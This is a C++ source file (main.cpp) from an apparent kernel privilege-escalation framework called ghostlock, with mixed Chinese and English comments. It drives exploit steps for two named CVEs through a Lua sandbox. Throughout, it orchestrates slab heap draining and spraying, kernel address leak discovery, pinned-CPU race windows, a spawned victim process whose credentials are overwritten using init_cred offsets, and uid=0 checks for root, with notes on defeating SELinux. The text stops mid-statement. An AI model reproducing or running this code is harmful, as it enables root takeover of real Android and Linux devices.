/** @file main.cpp
 *  The wire-driven Lua host (ROADMAP 序 2：main 直接启动 Lua 执行胶水程序).
 *
 *  设计（与 schema 一致）：
 *   1. stdin 的**长度前缀 framing** → 有界 JSON（script::WireDoc）；
 *   2. 取本次运行的 `step`（wire 单数＝选定的那一步）：key / backend / route / required_param[] /
 *      data[] / code；
 *   3. `code` 是 base64 的 Lua chunk，解码后在沙箱里跑（白名单 + 四预算）；
 *   4. 脚本读配置走沙箱只读 `cfg` 快照（点分名），调能力走 surface 的 7 项
 *       能力清单以 contract 的 surface 表为唯一权威，此处不再复述
 *   5. 不写死设备事实：`required_param` 点名而运行时未提供的（如 `sa`，只走会话帧）以
 *       写入路径未接入时，写类能力以 `write-path-unbuilt` 拒绝（不把缺路径说成缺设备）。
 *
 * 失败语义：每阶段一个具名 refusal 与一个退出码；不抛异常；sink 走 context，无新增全局状态。
 */
#include <cstdio>
#include <cstring>
#include <fcntl.h>
#include <unistd.h>
#include <span>
#include <string>
#include <string_view>
#include <vector>

#include "backend/cve_2026_43284/access_params.hpp"
#include "backend/cve_2026_43284/seam/pagecache_door_linux.hpp"
#include "backend/cve_2026_43284/seam/pagecache_write.hpp"
#include "backend/cve_2026_43284/seam/real_splice_io.hpp"
#include "backend/cve_2026_43284/session_frame.hpp"
#include "backend/cve_2026_43499/leak/snitch_region.hpp"
#include "pipeline/plan_gate.hpp"
#include "profile/glkv3_document.hpp"
#include "contract/op_registry.hpp"

#ifdef __ANDROID__
#include "backend/cve_2026_43499/steps/discovery_runner.hpp"
#include "backend/cve_2026_43499/steps/prepare_runner.hpp"
#include "backend/cve_2026_43499/seam/multicast_route_linux.hpp"
/* `select_stack` 的 syscall 面：此处包含只为**让它进 android 构建** ✓（NDK 零告警门禁会真正编译它 ✓），
 *  尚未接线 ✗（选择器仍报 route-not-ported:select_stack ✓）。 */
#include "backend/cve_2026_43499/seam/select_stack_route.hpp"
#include "backend/cve_2026_43499/seam/select_stack_route_linux.hpp"
#include "backend/cve_2026_43499/memory/credential_image.hpp"
#include "backend/cve_2026_43499/memory/heap_seam_linux.hpp"
#include "backend/cve_2026_43499/memory/payload_page.hpp"
#include "backend/cve_2026_43499/memory/page_slot.hpp"   /* 切片 2 ✓：修复页的一次性槽 ✓ */
#include "backend/victim/victim_process.hpp"
#include "backend/cve_2026_43499/steps/route_config.hpp"
#include "backend/cve_2026_43499/steps/window_runner.hpp"
#include "backend/cve_2026_43499/steps/words_region.hpp"
#endif
#include "backend/cve_2026_43499/steps/prepare_mapping.hpp"
#include "backend/cve_2026_43499/steps/window_steps.hpp"
#include "backend/cve_2026_43284/steps/pagecache_steps.hpp"
#include "contract/kernel_access.hpp"
#include "script/call_sink.hpp"
#include "script/sandbox.hpp"
#include "script/wire_doc.hpp"

using namespace ghostlock;

#if defined(__ANDROID__)
/* 受害者协议是设备侧单元：主机不认识它，别名也只在这里存在。 */
namespace cve_victim = ghostlock::backend::victim;
#endif

namespace {

    constexpr std::size_t kFrameCap = script::WireDoc::kMaxPayloadBytes;
    constexpr std::size_t kScriptCap = 64U * 1024U;
    constexpr std::size_t kFieldCap = 1024U;
    /** 帧路径的上限：wire 里的字符串是数据，落地前先看长度。 */
    constexpr std::size_t kFramePathCap = 256U;
    constexpr const char *kMapTag = "GLKv3_wire";
    /* 命名空间别名：不是 using 声明（2026-10-10 规则）。 */
    namespace cve = ghostlock::backend::cve_2026_43284;
    namespace cve49 = ghostlock::backend::cve_2026_43499;

    /** Where a step writes, per the wire: the schema's targets group names the file each step owns. */
    constexpr const char *step_door_key(std::string_view step) noexcept {
        if (step == "patch1") { return "backend.cve_2026_43284.targets.patch1_target"; }
        if (step == "hook") { return "backend.cve_2026_43284.targets.hook_target"; }
        return "backend.cve_2026_43284.targets.carrier";
    }

    /* Everything the step dispatch needs travels in the report, which the sink already carries:
     *  no new global state (AGENTS 4). */

    /** What one run did. Stack-owned; the sink reaches it through script::CallSink::context. */
    struct RunReport final {
        std::size_t calls = 0U;
        std::size_t fields = 0U;
        std::size_t handoffs = 0U;
        std::size_t steps = 0U;
        std::size_t skipped = 0U;
        const char *refusal = nullptr;
        const std::vector<std::string_view> *payloads = nullptr;
        const std::vector<std::string_view> *declared_backends = nullptr;
        const std::vector<std::string_view> *declared_steps = nullptr;
        std::string_view step_backend{};
        /* The dispatch@Q@s inputs: the document, the parameters being built, and the credentials. */
        const script::WireDoc *doc = nullptr;
        cve::AccessParams *params = nullptr;
        cve::SaMaterial *sa = nullptr;
        /** The door the last step resolved, so the report says which target the wire chose. */
        std::string_view step_door{};
        /* 43499 窗口阶段的数字（attempts / settle / chain rounds）。 */
        /** 43499 的载荷值（文档里的数据，非密钥）。 */
        std::uint64_t route_value = 0U;
        /** 哨兵：载荷页上第一个等待字（写入前后的比对，用来判定别名是否指到我们这页）。 */
        std::uint32_t payload_word_before = 0U;
        /** 写前六值（敏感哨兵 ✓）：before 打点处填充 ✓，写后打点处只读它 ⇒ **不依赖页指针** ✓。 */
        std::array<std::uint32_t, 6U> sentinel_before{};
        std::uint32_t payload_word_after = 0U;
        std::uint64_t payload_alias_delta = 0U;
        /** 受害者自报的 uid（拿到 root 的判据）。 */
        std::uint32_t victim_uid = 0xFFFFFFFFU;
        std::uint64_t step_stage_attempts = 0U;
        std::uint64_t step_stage_settle_us = 0U;
        std::uint64_t step_stage_extra = 0U;
        /** The region the preparation laid out, in bytes (0 when it did not get that far). */
        std::uint64_t step_region_bytes = 0U;
        /* 准备那一段的读数（43499 设备路径）。 */
        const char *prepare_status = nullptr;
        const char *snitch_verdict = nullptr;
        std::size_t snitch_probes = 0U;
        std::uint32_t snitch_rounds = 0U;
        std::uint64_t snitch_found = 0U;
        std::uint8_t snitch_loop_saw = 0U;
        std::uint64_t snitch_loop_address = 0U;
        int prepare_at_step = 0;
        std::size_t prepare_opened = 0U;
        std::size_t prepare_closed = 0U;
        std::uint64_t prepare_base = 0U;
        int prepare_error = 0;
        std::uint64_t prepare_groups[4] = {};
        std::uint64_t prepare_region_size = 0U;
        /** The per-group descriptor counts the preparation reported (pre, spray, post, leak). */
        std::size_t prepare_open_groups[4] = {};
        std::size_t prepare_close_groups[3] = {};
        std::uint64_t prepare_object_size = 0U;
        std::uint64_t prepare_socket_buffer = 0U;
        std::uint64_t prepare_send_size = 0U;
        std::uint64_t prepare_main_cpu = 0U;
        std::uint64_t prepare_max_attempts = 0U;
        std::uint64_t prepare_poll_rounds = 0U;
        std::uint64_t prepare_page_size = 0U;
        /** The scan window, read in main and used inside the sink. */
        std::uint64_t scan_start = 0U;
        std::uint64_t scan_bytes = 0U;
        std::uint64_t scan_counter_offset = 0U;
        /** The discovery run, when the 43499 path got that far. */
        const char *discovery_verdict = nullptr;
        std::size_t discovery_probes = 0U;
        std::uint32_t discovery_rounds = 0U;
        std::uint64_t discovery_found = 0U;
    };

    /** Read the 43499 preparation values out of the wire. The key list is the mapping table itself,
     *  so a key is spelled once in the tree; a missing key leaves its value at zero and the mapping
     *  is what refuses, by name. */
    void read_43499_values(const script::WireDoc &doc, cve49::steps::PrepareValues &values) noexcept {
        struct Slot final {
            const char *input;
            std::uint64_t *value;
        };
        const Slot slots[] = {
            {"snitch_collisions", &values.snitch_collisions},
            {"snitch_threads", &values.snitch_threads},
            {"futex_table_size", &values.futex_table_size},
            {"mm_struct_sz", &values.mm_struct_sz},
            {"region_threads", &values.region_threads},
            {"snitch_round_wait_us", &values.snitch_round_wait_us},
            {"snitch_wake_rounds", &values.snitch_wake_rounds},
            {"prepare_max_attempts", &values.prepare_max_attempts},
            {"prepare_timeout_ms", &values.prepare_timeout_ms},
            {"kernelsnitch_timeout_ms", &values.kernelsnitch_timeout_ms},
            {"setup_settle_us", &values.setup_settle_us},
            {"state_poll_interval_us", &values.state_poll_interval_us},
            {"route_wait_ms", &values.route_wait_ms},
            {"route_done_timeout_ms", &values.route_done_timeout_ms},
            {"waiter_offset", &values.waiter_offset},
            {"task_offset", &values.task_offset},
            {"lock_offset", &values.lock_offset},
            {"buffer_size", &values.buffer_size},
            {"page_size", &values.page_size},
            {"header_bytes", &values.header_bytes},
            {"region_size", &values.region_size},
            {"object_size", &values.object_size},
            {"total_pokes", &values.total_pokes},
            {"pre_groups", &values.pre_groups},
            {"spray_groups", &values.spray_groups},
            {"post_groups", &values.post_groups},
            {"leak_groups", &values.leak_groups},
            {"word_bytes", &values.word_bytes},
            {"handle_bytes", &values.handle_bytes},
            {"coarse_stride", &values.coarse_stride},
            {"slab_stride", &values.slab_stride},
            {"mm_objs_per_slab", &values.mm_objs_per_slab},
            {"shaped", &values.shaped},
            {"socket_buffer", &values.socket_buffer},
            {"send_size", &values.send_size},
        };
        for (const Slot &slot : slots) {
            for (std::size_t i = 0U; i < cve49::steps::kPrepareInputKeyCount; ++i) {
                const cve49::steps::PrepareInputKey &row = cve49::steps::kPrepareInputKeys[i];
                if (row.wire_key == nullptr || std::strcmp(row.input, slot.input) != 0) { continue; }
                const script::JsonNode *node = doc.find(row.wire_key);
                std::uint64_t value = 0U;
                if (node == nullptr) { continue; }
                /* 数字与 0x 串走 u64_of；bool 也算数（shaped 就是 bool）。 */
                bool boolean = false;
                if (doc.u64_of(*node, value)) {
                    *slot.value = value;
                } else if (doc.bool_of(*node, boolean)) {
                    *slot.value = boolean ? 1U : 0U;
                }
            }
        }
    }
    /** Build the parameters one step needs: the wire"s values, the backend"s own hook plan, and the
     *  credentials the runtime handed over. A missing value is a named reason, never a zero. */
    const char *build_params(const script::WireDoc &doc, const cve::SaMaterial *sa,
                             cve::AccessParams &out) noexcept {
        const struct { const char *key; const char *value; } strings[] = {
            {"backend.cve_2026_43284.targets.carrier", nullptr},
            {"backend.cve_2026_43284.targets.dev_carrier", nullptr},
            {"backend.cve_2026_43284.targets.patch1_target", nullptr},
            {"backend.cve_2026_43284.targets.hook_target", nullptr},
        };
        static_cast<void>(strings);
        /* 这些字段的装配按 wire 的键逐个取；缺一个就具名拒绝。 */
        std::string_view carrier{};
        std::string_view dev_carrier{};
        std::string_view patch_target{};
        std::string_view hook_target{};
        const auto take = [&doc](const char *key, std::string_view &into) noexcept {
            const script::JsonNode *node = doc.find(key);
            return node != nullptr && doc.str_of(*node, into) && !into.empty();
        };
        if (!take("backend.cve_2026_43284.targets.carrier", carrier) ||
            !take("backend.cve_2026_43284.targets.dev_carrier", dev_carrier) ||
            !take("backend.cve_2026_43284.targets.patch1_target", patch_target) ||
            !take("backend.cve_2026_43284.targets.hook_target", hook_target)) {
            return "step-target-missing";
        }
        if (sa == nullptr || !sa->set) { return "session-frame-missing"; }
        out.sa = *sa;
        out.carrier = {carrier.data(), carrier.size()};
        out.dev_carrier = {dev_carrier.data(), dev_carrier.size()};
        out.patch_target = {patch_target.data(), patch_target.size()};
        out.hook_image = {hook_target.data(), hook_target.size()};
        out.hook_plan = cve::hook::device_sentry_plan();
        out.hook_plan_set = true;
        std::uint64_t value = 0U;
        const auto number = [&doc, &value](const char *key, std::uint64_t &into) noexcept {
            const script::JsonNode *node = doc.find(key);
            if (node == nullptr || !doc.u64_of(*node, value)) { return false; }
            into = value;
            return true;
        };
        std::uint64_t delay = 0U;
        std::uint64_t budget = 0U;
        std::uint64_t poll = 0U;
        if (!number("backend.cve_2026_43284.execution.trigger.delay_ms", delay) ||
            !number("backend.cve_2026_43284.execution.wait.budget_ms", budget) ||
            !number("backend.cve_2026_43284.execution.wait.poll_ms", poll)) {
            return "step-execution-missing";
        }
        out.trigger_delay_ms = static_cast<std::uint32_t>(delay);
        out.wait_ms = static_cast<std::uint32_t>(budget);
        static_cast<void>(poll);
        std::string_view loaded{};
        std::string_view failed{};
        std::string_view hook_marker{};
        std::string_view module_marker{};
        if (!take("backend.cve_2026_43284.markers.loaded", loaded) ||
            !take("backend.cve_2026_43284.markers.failed", failed) ||
            !take("backend.cve_2026_43284.markers.hook", hook_marker) ||
            !take("backend.cve_2026_43284.markers.module", module_marker)) {
            return "step-markers-missing";
        }
        out.success_marker = {loaded.data(), loaded.size()};
        out.failure_marker = {failed.data(), failed.size()};
        out.in_flight_marker = {hook_marker.data(), hook_marker.size()};
        out.module_marker = {module_marker.data(), module_marker.size()};
        if (!out.consistent()) { return "step-params-inconsistent"; }
        return nullptr;
    }

    /** Run one step the wire asked for. @return nullptr when it ran, or a named reason. */
    /** 退役 `slab_drain`（primitives.cpp:30 ✓，本树原先没有 ✗）：**开战前的堆排空** ——
     *  fork/pause/kill 两波（开机 >60 s 时 2×64 ✓，否则 1×32 ✓）⇒ 让随后的 spray 落点可预期 ✓。
     *  退役在**每阶段第一次尝试前**调用（`steps.cpp:86` ✓）。判据：任一轮 `victim uid=0` ✓。 */
    [[maybe_unused]] void drain_slab_waves() noexcept {
#if defined(__ANDROID__)
        /* 平台守卫：与退役同形（其 primitives.cpp 也是 Android-only）。 */
        struct timespec up{};
        (void) ::clock_gettime(CLOCK_BOOTTIME, &up);
        const int waves = (up.tv_sec > 60) ? 2 : 1;
        const int batch = (up.tv_sec > 60) ? 64 : 32;
        pid_t kids[64] = {};
        for (int wave = 0; wave < waves; ++wave) {
            int n = 0;
            for (int i = 0; i < batch && n < 64; ++i) {
                const pid_t pid = ::fork();
                if (pid == 0) { ::pause(); ::_exit(0); }
                if (pid > 0) { kids[n++] = pid; break; }
                break;
            }
            for (int i = 0; i < n; ++i) { (void) ::kill(kids[i], SIGKILL); }
            for (int i = 0; i < n; ++i) {
                while (::waitpid(kids[i], nullptr, 0) < 0 && errno == EINTR) {
                }
            }
        }
#endif
    }

    const char *run_wire_step(RunReport &report, std::string_view step) noexcept {
        if (report.doc == nullptr) { return "step-no-document"; }
        if (report.step_backend == "cve_2026_43499") {
            /* 43499 的三个窗口阶段：数字从 wire 取，真正的竞态是设备侧的，所以尝试钩子在这里是空。 */
            cve49::steps::WindowStep stage{};
            if (!cve49::steps::window_step_by_name(step, stage)) { return "step-unknown"; }
            const auto take_stage = [&report](const std::string &suffix, std::uint64_t &into) noexcept {
                const script::JsonNode *node = report.doc->find(std::string("backend.cve_2026_43499.execution.stages.") + suffix);
                return node != nullptr && report.doc->u64_of(*node, into);
            };
            std::uint64_t a = 0U;
            std::uint64_t s_us = 0U;
            std::uint64_t extra = 0U;
            const char *prefix = stage == cve49::steps::WindowStep::W1 ? "w1_" :
                                (stage == cve49::steps::WindowStep::W2 ? "w2_" : "w3_");
            if (!take_stage(std::string(prefix) + "attempts", a) ||
                !take_stage(std::string(prefix) + "settle_us", s_us)) {
                return "step-execution-missing";
            }
            if (stage == cve49::steps::WindowStep::W3) {
                if (!take_stage("w3_chain_rounds", extra)) { return "step-execution-missing"; }
            }
            /* 值按映射表读（键只写一处），再按段映射：缺哪个值就报哪个名字。 */
            cve49::steps::PrepareValues values{};
            read_43499_values(*report.doc, values);
            cve49::steps::AllMapped mapped{};
            const char *mapped_refusal = nullptr;
            if (!cve49::steps::map_all_prepare(values, mapped, &mapped_refusal)) {
                return mapped_refusal == nullptr ? "prepare-value-missing:unknown" : mapped_refusal;
            }
            report.step_stage_attempts = a;
            report.step_stage_settle_us = s_us;
            report.step_stage_extra = extra;
            /* 值有了就先把区域排出来：这是一次真实的消费，也是那 24 个值的第一道判据。 */
            cve49::leak::RegionLayout layout{};
            if (cve49::leak::layout_snitch_region(mapped.region.inputs, layout) !=
                cve49::leak::RegionVerdict::Ok) {
                return "prepare-region-refused";
            }
            report.step_region_bytes = layout.total_bytes;
#ifdef __ANDROID__
            /* 发现那一段：窗口用本树实测过的值（见 profile 的 scan 组），跑一次搜索。 */
            cve49::steps::DiscoveryRequest discovery{};
            discovery.setup = mapped.base.snitch;
            discovery.region = mapped.region.inputs;
            discovery.patience = mapped.region.patience;
            discovery.strides = mapped.region.strides;
            discovery.range.start = report.scan_start;
            /* 饱和加法：窗口末端就是地址空间末端时（本树实测的那一组正是如此），相加会回绕成 0，
             *  走查会判成空窗。树里自己用的也是 0xffffffffffffffff。 */
            const std::uint64_t kMaxAddress = ~static_cast<std::uint64_t>(0U);
            discovery.range.end = (report.scan_bytes > 0U &&
                                   report.scan_start <= kMaxAddress - report.scan_bytes)
                                          ? report.scan_start + report.scan_bytes
                                          : kMaxAddress;
            discovery.counter_offset = static_cast<std::size_t>(report.scan_counter_offset);
            cve49::steps::DiscoveryOutcome found{};
            const char *discovery_refusal = nullptr;
            if (!cve49::steps::run_discovery(discovery, found, &discovery_refusal)) {
                return discovery_refusal == nullptr ? "discovery-refused" : discovery_refusal;
            }
            report.discovery_verdict = found.verdict;
            report.discovery_probes = found.probes;
            report.discovery_rounds = found.rounds;
            report.discovery_found = found.found;
#ifdef __ANDROID__
            /* 准备那一段：证明地址 + 队列字 + 策略 ⇒ 页准备，产出窗口要的两个字。 */
            /* 字要活过准备这一段（窗口三步之后才用），所以它们的归属在这一层。 */
            cve49::steps::WordsRegion words_region{};
            cve49::steps::PrepareRequest prepare{};
            prepare.setup = discovery.setup;
            prepare.region = discovery.region;
            prepare.patience = discovery.patience;
            prepare.strides = discovery.strides;
            prepare.range = discovery.range;
            prepare.counter_offset = discovery.counter_offset;
			prepare.inputs = cve49::memory::PrepareInputs{};
            /* 可选键（退役 `pre_ctx` ✓，"0 = 相位不存在" ✓）：文档里有就取、没有当 0。
             *  映射表**不碰**这个字段 ⇒ 不会被"必需键"规则拒绝 ✓（round 143 的教训 ✓）。 */
            {
                const script::JsonNode *ps_node =
                        report.doc->find("backend.cve_2026_43499.execution.heap.pre_shaped_groups");
                std::uint64_t ps_value = 0U;
                if (ps_node != nullptr && report.doc->u64_of(*ps_node, ps_value)) {
                    prepare.inputs.pre_shaped_groups = static_cast<std::size_t>(ps_value);
                }
            }
            prepare.inputs.pre_groups = static_cast<std::size_t>(report.prepare_groups[0]);
            prepare.inputs.spray_groups = static_cast<std::size_t>(report.prepare_groups[1]);
            prepare.inputs.post_groups = static_cast<std::size_t>(report.prepare_groups[2]);
            prepare.inputs.leak_groups = static_cast<std::size_t>(report.prepare_groups[3]);
            prepare.inputs.snitch_collisions = static_cast<std::size_t>(discovery.setup.collisions);
            prepare.inputs.region_size = report.prepare_region_size;
            prepare.inputs.object_size = report.prepare_object_size;
            prepare.geometry.socket_buffer = static_cast<std::int32_t>(report.prepare_socket_buffer);
            prepare.geometry.send_size = static_cast<std::size_t>(report.prepare_send_size);
            prepare.geometry.main_cpu = static_cast<std::int32_t>(report.prepare_main_cpu);
            prepare.waiting.max_attempts = static_cast<std::size_t>(report.prepare_max_attempts);
            prepare.waiting.poll_rounds = static_cast<std::size_t>(report.prepare_poll_rounds);
            prepare.page_size = report.prepare_page_size;
            prepare.words = &words_region;
            prepare.proof_seed = report.scan_start;
            prepare.proof_count = static_cast<std::size_t>(discovery.setup.collisions);
            cve49::steps::PrepareReport prepared{};
            const char *prepare_refusal = nullptr;
            /* 退役式重试（round 122）：Zero 路要求页面值的奇偶合格 ——
             *  `((page_value >> 16) & 1) == 1`（否则清掉 selinux_state.initialized ✗）⇒
             *  而 page_value = 准备给出的 base + payload_delta + 0x100 ⇒ 奇偶由这次准备决定 ✓
             *  ⇒ 不合格就**再准备一次**（最多 3 次 ✓，与退役的 scratch 修复重试同形 ✓）。 */
            /* delta 是文档值（准备**之前**就能读 ✓）⇒ 预检用真值 `base + delta + 0x100` ✓。 */
            std::uint64_t payload_delta = 0U;
            {
                const script::JsonNode *delta_node =
                        report.doc->find("backend.cve_2026_43499.route.multicast_waiter.payload.delta");
                std::uint64_t delta_early = 0U;
                if (delta_node != nullptr && report.doc->u64_of(*delta_node, delta_early)) {
                    payload_delta = delta_early;
                }
            }
            bool parity_ok = false;
            for (int prepare_try = 1; prepare_try <= 8 && !parity_ok; ++prepare_try) {
                if (!cve49::steps::run_prepare(prepare, prepared, &prepare_refusal)) {
                    return prepare_refusal == nullptr ? "prepare-refused" : prepare_refusal;
                }
                const std::uint64_t candidate = prepared.base + 0x100U;   /* 与判据同式 ✓ */
                /* ★★ 第 219 轮 ✓（权威 `payload_write_layout_accepts_page` 逐字 ✓）：bit16 的要求
                 *  **只对 `Zero + preserve`** 成立 ✓ ⇒ 本树原先**无条件**要求 ✗ ⇒ `w2`（Credential ✓）
                 *  白等 8 次（真机 `ok=0` × 5 ✓）⇒ 按权威加条件 ✓。 */
                parity_ok = prepared.base != 0U &&
                            ((step == "w2") || (((candidate >> 16U) & 1U) == 1U));
                /* ★ 第 165 轮 ✓（旧码同形 ✓）：失败后**扰动堆**再试 —— 否则"释放即重分配"会让内核
                 *  把**同一块**还回来（真机实测：8 次同址 `0xffff800000060000` ⇒ bit16 恒 0 ✗）⇒
                 *  退役的 `retry_write_stage` 每轮之间也有 `slab_drain()` 与 `usleep` ✓ ⇒ 补上 ✓。 */
                if (!parity_ok) { usleep(50000); }   /* ★ 本树无 `slab_drain` ✗ ⇒ 只用时间扰动 ✓ */
                /* 奇偶：两次尝试都失败（"释放再试"⇒ 4 次同址；"扣住不放"⇒ base=0）⇒ 保留重试但不再动资源。 */
                std::printf("main: prepare parity try=%d base=0x%llx delta=0x%llx cand=0x%llx ok=%d", prepare_try,
                            static_cast<unsigned long long>(prepared.base),
                            static_cast<unsigned long long>(payload_delta),
                            static_cast<unsigned long long>(candidate), parity_ok ? 1 : 0);
            }
            report.prepare_status = prepared.status;
            report.prepare_at_step = prepared.at_step;
            report.prepare_opened = prepared.opened;
            report.prepare_closed = prepared.closed;
            report.prepare_base = prepared.base;
            report.prepare_error = prepared.error;
            report.snitch_verdict = prepared.snitch_verdict;
            report.snitch_probes = prepared.snitch_probes;
            report.snitch_rounds = prepared.snitch_rounds;
            report.snitch_found = prepared.snitch_found;
            report.snitch_loop_saw = prepared.snitch_loop_saw;
            report.snitch_loop_address = prepared.snitch_loop_address;
            report.prepare_open_groups[0] = prepared.opened_pre;
            report.prepare_open_groups[1] = prepared.opened_spray;
            report.prepare_open_groups[2] = prepared.opened_post;
            report.prepare_open_groups[3] = prepared.opened_leak;
            report.prepare_close_groups[0] = prepared.closed_pre;
            report.prepare_close_groups[1] = prepared.closed_spray;
            report.prepare_close_groups[2] = prepared.closed_post;
#endif
            /* 路由配置：值**全按映射表读**（0 就是调用方没说），缺一位就具名拒绝（不填默认）。 */
            /* 载荷区＝区里 48K 起的那 16K（刚好够退役布局：0x1280 + task 字段 + cred 176）。 */
            constexpr std::size_t kPayloadAreaBytes = 0x4000U;
            cve49::steps::RouteConfigValues route_values{};
            {
                const auto num = [&report](const char *path, std::uint64_t &into) noexcept {
                    const script::JsonNode *node = report.doc->find(path);
                    if (node == nullptr) { return; }
                    static_cast<void>(report.doc->u64_of(*node, into));
                };
                num("backend.cve_2026_43499.route.multicast_waiter.abi.waiter_off", route_values.waiter_offset);
                num("backend.cve_2026_43499.route.multicast_waiter.abi.task_offset", route_values.task_offset);
                num("backend.cve_2026_43499.route.multicast_waiter.abi.lock_offset", route_values.lock_offset);
                num("backend.cve_2026_43499.route.multicast_waiter.abi.buffer_size", route_values.buffer_size);
                num("backend.cve_2026_43499.route.multicast_waiter.execution.attempts", route_values.max_attempts);
                num("backend.cve_2026_43499.route.multicast_waiter.execution.arm_sequence", route_values.arm_sequence);
                num("backend.cve_2026_43499.route.multicast_waiter.execution.arm_hold", route_values.arm_hold);
                num("backend.cve_2026_43499.execution.race.route_wait_ms", route_values.park_ms);
                num("backend.cve_2026_43499.execution.race.setup_settle_us", route_values.settle_us);
                num("backend.cve_2026_43499.execution.consumer.delay_us", route_values.consumer_delay_us);
                /* ★ 注意（第 111 轮 ✓）：`race.setup_settle_us` **早已被读进 `route_values.settle_us`** ✓（见上一行 ✓）；
                 *  而本树此前**没人用它** ✗ ⇒ ⇒ **⇒ 正是"读进来却没接上"** ✓ ⇒ 接法见 `route_config.cpp`（下一步 ✓）。 */
                /* 退役的两个相位（waiter.*_settle_us ✓）：走 wire，缺了就是 0（= 不等）。 */
                num("backend.cve_2026_43499.execution.race.post_requeue_settle_us", route_values.post_requeue_settle_us);
                num("backend.cve_2026_43499.execution.race.post_adjust_settle_us", route_values.post_adjust_settle_us);
                num("backend.cve_2026_43499.execution.consumer.burst_calls", route_values.burst_calls);
                num("backend.cve_2026_43499.execution.consumer.max_calls", route_values.max_calls);
                num("backend.cve_2026_43499.execution.consumer.fallback_lock_us", route_values.fallback_lock_us);
                num("backend.cve_2026_43499.execution.consumer.nice_modulus", route_values.nice_modulus);
                /* 固定 CPU 对（退役门禁要求 ✓）：两个键都在文档里；缺了就是"不 pin"（-1）。 */
                {
                    std::uint64_t cpu_main = 0U;
                    std::uint64_t cpu_consumer = 0U;
                    const bool has_main =
                            report.doc->find("backend.cve_2026_43499.execution.recommended_cpus.main") !=
                            nullptr;
                    const bool has_consumer =
                            report.doc->find("backend.cve_2026_43499.execution.recommended_cpus.consumer") !=
                            nullptr;
                    num("backend.cve_2026_43499.execution.recommended_cpus.main", cpu_main);
                    num("backend.cve_2026_43499.execution.recommended_cpus.consumer", cpu_consumer);
                    route_values.main_cpu = has_main ? static_cast<std::int64_t>(cpu_main) : -1;
                    route_values.consumer_cpu =
                            has_consumer ? static_cast<std::int64_t>(cpu_consumer) : -1;
                    std::printf("main: cpus main=%lld consumer=%lld",
                                static_cast<long long>(route_values.main_cpu),
                                static_cast<long long>(route_values.consumer_cpu));
                }
                num("backend.cve_2026_43499.execution.consumer.policy", route_values.policy);
                num("backend.cve_2026_43499.payload.value", route_values.value);
            }
            /* 先 spawn 受害者：写目标是**它的** cred（退役顺序：spawn ⇒ child_task + cred_off 当 target ⇒ 写）。 */
            cve_victim::VictimContext victim{};
            cve_victim::VictimSpawn spawned{};
            /* 退役同形：泄漏没中就**重开一轮**（"Retry means the perf leak missed and the chain
             *  should respawn"）。三次仍不一致就具名报出来，说清是三种里的哪一种。 */
            cve_victim::SpawnRefusal spawn_refusal = cve_victim::SpawnRefusal::LeakDisagreed;
            for (int spawn_attempt = 0; spawn_attempt < 3; ++spawn_attempt) {
                spawn_refusal = cve_victim::spawn_victim(victim, spawned);
                if (spawn_refusal == cve_victim::SpawnRefusal::Ok) {
                    break;
                }
            }
            if (spawn_refusal != cve_victim::SpawnRefusal::Ok) {
                switch (spawn_refusal) {
                    case cve_victim::SpawnRefusal::Pipes: return "victim-pipes-failed";
                    case cve_victim::SpawnRefusal::Fork: return "victim-fork-failed";
                    default: return "victim-leak-disagreed";
                }
            }
            std::printf("main: victim spawned task=0x%llx", static_cast<unsigned long long>(spawned.task));
            std::uint64_t victim_cred_off = 0U;
            std::uint64_t victim_comm_off = 0U;
            /* layout 算出的"内核该写的那个字"（Zero+preserve ⇒ page_base + 0x100），供阶段用。 */
            std::uintptr_t page_write_value = 0U;
            /* 选项 B：页面的内核地址由**准备阶段的泄漏 base** 决定（base + payload.delta ✓），
             *  不再用堆的 alias_delta（那是另一个空间 ✗）。 */
            /* payload_delta 的声明前移到准备之前（奇偶预检要用它 ✓）。 */
            std::vector<std::uint8_t> page_image;
            std::uint64_t init_cred_image = 0U;
            std::uint64_t init_task_image = 0U;
            std::uint64_t phys_load = 0U;
            std::uint64_t selinux_enforcing_image = 0U;
            std::uint64_t phys_offset = 0U;
            /* 建页/修复轮共享的常量（round 140 上提 ✓，原先只声明在建页块内 ✗）。 */
            constexpr std::size_t kOrder3 = 32768U;
            constexpr std::size_t kChunks = 2U;
            constexpr std::uint64_t kAliasBase = 0xffffff8000000000ULL;
            /* alias_image_delta 的**取值**必须等文档读进来（上提时算成 0 过 ✗）：
             *  就地读一次 δ = kernel_phys_load − kernel_phys_offset（退役归档值 0x28000000 ✓）。 */
            {
                const script::JsonNode *pl =
                        report.doc->find("backend.cve_2026_43499.abi.offset.kernel_phys_load");
                const script::JsonNode *po =
                        report.doc->find("backend.cve_2026_43499.abi.offset.kernel_phys_offset");
                std::uint64_t pl_v = 0U;
                std::uint64_t po_v = 0U;
                if (pl != nullptr && po != nullptr && report.doc->u64_of(*pl, pl_v) &&
                    report.doc->u64_of(*po, po_v) && pl_v > po_v) {
                    phys_load = pl_v;
                    phys_offset = po_v;
                }
            }
            cve49::memory::LayoutInputs layout_inputs{};   /* 建页/修复轮共享（round 140 上提 ✓） */
            cve49::memory::PayloadPageInputs page_inputs{};   /* 建页/修复轮共享（round 140 上提 ✓） */
            const std::uint64_t alias_image_delta =
                    (phys_load > phys_offset) ? (phys_load - phys_offset) : 0U;

            std::uint64_t root_task_group_image = 0U;
            cve49::memory::CredentialLayout cred_layout{};
            std::uint64_t cred_u64[15] = {};
            {
                /* 凭据路径的输入（全部来自文档，不设默认值）：init_cred 的镜像地址 + 拷布局九域。 */
                const script::JsonNode *ic_node = report.doc->find("backend.cve_2026_43499.abi.offset.init_cred");
                if (ic_node == nullptr || !report.doc->u64_of(*ic_node, init_cred_image) || init_cred_image == 0U) {
                    victim.retire_child();
                    return "credential-image-missing";
                }
                /* 凭据拷贝布局：十五个键逐条从文档读，缺一个就具名拒绝（不设默认值）。 */
                {
                    struct CredKey final { const char *name; std::uint64_t *slot; };
                    const CredKey keys[] = {
                        {"copy_size", &cred_u64[0]}, {"usage_offset", &cred_u64[1]},
                        {"usage_value", &cred_u64[2]}, {"caps_offset", &cred_u64[3]},
                        {"caps_count", &cred_u64[4]}, {"caps_value", &cred_u64[5]},
                        {"ref0_offset", &cred_u64[6]}, {"ref1_offset", &cred_u64[7]},
                        {"ref2_offset", &cred_u64[8]}, {"ref3_offset", &cred_u64[9]},
                        {"ref0_image", &cred_u64[10]}, {"ref1_image", &cred_u64[11]},
                        {"ref2_image", &cred_u64[12]}, {"ref3_image", &cred_u64[13]},
                        {"ref_count", &cred_u64[14]},
                    };
                    for (const CredKey &key : keys) {
                        char full[96] = {};
                        const int written = std::snprintf(full, sizeof(full), "backend.cve_2026_43499.abi.cred.%s", key.name);
